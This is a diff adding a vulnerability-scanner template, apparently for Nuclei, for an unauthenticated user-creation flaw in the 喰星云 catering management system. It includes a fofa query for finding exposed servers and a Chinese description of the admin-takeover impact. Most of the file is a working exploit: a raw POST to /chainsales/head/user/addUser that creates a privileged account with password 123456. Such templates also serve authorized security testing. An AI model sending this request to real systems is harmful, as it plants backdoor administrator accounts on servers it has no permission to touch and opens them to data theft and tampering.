@@ -1,0 +1,32 @@
+id: huixingyun-catering-add-user
+
+info:
+  name: "喰星云数字化餐饮服务系统 addUser 接口未授权创建用户漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="tmp_md5_pwd"
+      喰星云数字化餐饮服务系统存在未授权访问接口，攻击者可通过该接口创建管理员账户实现权限提升。该缺陷允许远程攻击者绕过身份验证机制，直接向系统注入特权用户凭证，导致后台管理权限被完全控制。攻击成功后可获取敏感业务数据、篡改系统配置，造成持续性安全威胁。
+  tags: 喰星云
+
+http:
+- raw:
+  - |
+    POST /chainsales/head/user/addUser HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.9
+    sec-ch-ua-mobile: ?0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Accept-Encoding: gzip, deflate
+
+    username=NdayTest&rname=&alias=&mobile=&sno=&invoice_sno=&department_name=&alipay_account=&emailtype=1&email=&emailpwd=&pwd=123456&repwd=123456&newusertype=1&lsid=10000&rlid%5B%5D=-2
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
